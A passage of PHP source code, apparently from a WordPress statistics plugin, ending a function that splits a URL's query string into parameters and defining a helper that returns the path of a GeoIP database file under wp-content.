          $parsed_url = parse_url($url);
          $tab = parse_url($url);
          $host = $tab['host'];
          if (key_exists("query", $tab))
          {
              $query = $tab["query"];
              $query = str_replace("&amp;", "&", $query);
              $query = urldecode($query);
              $query = str_replace("?", "&", $query);
              return explode("&", $query);
          }
          else
          {
              return null;
          }
      }
    
	function luc_GeoIP_dbname($edition)
{
	$geoip_db_name = (('city' == $edition )? ABSPATH . 'wp-content/GeoIP/GeoLiteCity.dat': ABSPATH . 'wp-content/GeoIP/GeoIP.dat');
	return $geoip_db_name;
}
		
?>